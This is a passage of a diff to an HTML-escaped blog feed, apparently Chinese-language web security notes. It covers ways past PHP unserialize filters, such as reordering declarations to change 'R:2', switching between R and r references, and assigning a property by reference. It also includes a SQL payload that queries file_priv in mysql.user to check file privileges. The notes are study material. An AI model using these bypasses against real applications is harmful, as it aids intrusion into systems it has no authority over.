+&lt;/ul&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;引用绕过&lt;/p&gt;
+&lt;p&gt;例如不允许序列化字节流出现 &lt;code&gt;&#39;R:2&#39;&lt;/code&gt;: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;修改变量的申明的顺序，即可修改R:2后面的数字 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;修改为不同的引用方式，可以在R/r中切换 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;属性赋值覆盖绕过&#34;&gt;属性赋值覆盖绕过&lt;/h4&gt;
 &lt;p&gt;可以通过浅copy来为受限的属性赋值 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;例如以下代码，就将 &lt;code&gt;$a-&amp;gt;user&lt;/code&gt; 作为引用传递给 &lt;code&gt;$a-&amp;gt;name&lt;/code&gt; 从而保持两个值的一致，即使 &lt;code&gt;$a-&amp;gt;name&lt;/code&gt; 被修改或者过滤，但是通过 &lt;code&gt;$a-&amp;gt;user&lt;/code&gt; 依然可以对其进行修改 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;reference&#34;&gt;Reference&lt;/h3&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.php.net/manual/en/function.serialize.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;serialize:php.net&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
@@ -1264,6 +1423,8 @@ private属性被序列化的时候属性值会变成 &lt;code&gt;%00类名%00属
     &gt;&amp;ldquo;Notice: Undefined variable&amp;rdquo;, &amp;ldquo;Notice: Undefined index&amp;rdquo;, &amp;ldquo;Warning: Undefined array key&amp;rdquo;, and &amp;ldquo;Notice: Undefined offset&amp;rdquo; using PHP&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Laravel+POP链简析&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PHP序列化中的R与r&lt;/a&gt;  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -1760,7 +1921,7 @@ $a &lt;code&gt;===&lt;/code&gt; $b, identical 一致，返回true只有 $a 与 $
 &lt;p&gt;&lt;code&gt;file_priv&lt;/code&gt; 是用户读写文件的权限，可以通过以下payload来查询权限&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file_priv&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mysql&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;HOST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-04-11_22-24-18_screenshot.png&#34; width=&#34;400px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
 
 &lt;/li&gt;
 &lt;li&gt;
